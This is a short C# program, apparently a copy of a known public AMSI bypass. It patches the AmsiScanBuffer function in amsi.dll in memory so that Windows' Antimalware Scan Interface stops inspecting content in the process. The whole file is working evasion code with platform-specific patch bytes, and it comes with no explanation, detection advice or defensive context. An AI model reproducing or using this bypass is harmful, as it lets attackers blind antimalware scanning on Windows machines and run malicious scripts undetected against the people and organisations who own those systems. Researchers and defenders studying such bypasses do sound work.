// Raste Mouse C# Amsi Bypass
namespace amsi
{
    public class Program
    {
        static byte[] GetPatch
        {
            get
            {
                if (Is64Bit)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }
                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }
        
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
        public static void Main(string[] args){
            var lib = LoadLibrary("amsi.dll");
            var asb = GetProcAddress(lib, "AmsiScanBuffer");

            var patch = GetPatch;

            // Set region to RWX
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

            // Copy patch
            Marshal.Copy(patch, 0, asb, patch.Length);

            // Restore region to RX
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
        }
     }
}
